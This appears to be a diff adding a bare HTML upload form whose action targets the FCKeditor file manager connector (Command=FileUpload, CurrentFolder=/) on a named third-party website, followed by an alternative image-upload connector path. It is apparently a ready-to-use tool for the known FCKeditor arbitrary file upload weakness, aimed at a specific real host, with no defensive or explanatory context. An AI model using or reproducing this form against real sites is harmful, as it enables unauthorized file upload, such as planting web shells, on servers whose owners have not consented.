@@ -1,0 +1,8 @@
+<form id="frmUpload" action="http://www.hina.com.tw/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=File&CurrentFolder=/" method="post" enctype="multipart/form-data">
+File Upload<br />
+<input id="txtFileUpload" type="file" name="NewFile" />
+<input type="submit" value="Upload"  />
+</form>
+
+
+aspx/connector.aspx?Command=FileUpload&Type=image&CurrentFolder=/
